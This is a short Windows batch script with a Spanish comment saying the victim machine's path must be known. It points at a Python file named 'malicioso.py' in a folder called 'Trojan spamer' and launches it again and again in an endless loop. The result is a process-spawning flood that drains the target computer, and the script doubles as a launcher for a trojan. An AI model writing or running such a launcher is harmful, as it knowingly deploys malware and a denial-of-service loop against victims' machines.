REM se debe conocer la ruta de la maquina victima
@echo off
set "ruta=C:\Users\crist\Desktop\Python\Trojan spamer\malicioso.py"
:loop
start python %ruta%
goto loop
